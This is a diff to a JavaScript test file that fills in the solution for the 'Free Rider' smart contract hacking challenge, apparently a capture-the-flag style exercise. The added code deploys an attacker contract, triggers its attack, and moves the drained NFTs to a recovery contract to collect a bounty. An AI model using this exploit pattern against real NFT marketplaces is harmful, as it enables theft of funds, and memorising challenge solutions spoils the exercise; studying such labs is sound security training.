@@ -106,6 +106,17 @@ describe('[Challenge] Free Rider', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        const attacker = await (await ethers.getContractFactory('AttackerFreeRider', deployer))
+            .deploy(marketplace.address, devsContract.address, uniswapPair.address, weth.address, player.address);
+        await attacker.connect(player);
+        await attacker.attack({value: PLAYER_INITIAL_ETH_BALANCE});
+
+        const abi = ethers.utils.defaultAbiCoder;
+        for (var id = 0; id < AMOUNT_OF_NFTS; id++) {
+            await nft.connect(player)
+                .functions['safeTransferFrom(address,address,uint256,bytes)']
+                (attacker.address, devsContract.address, id, abi.encode(["address"], [player.address]))
+        }
     });
 
     after(async function () {
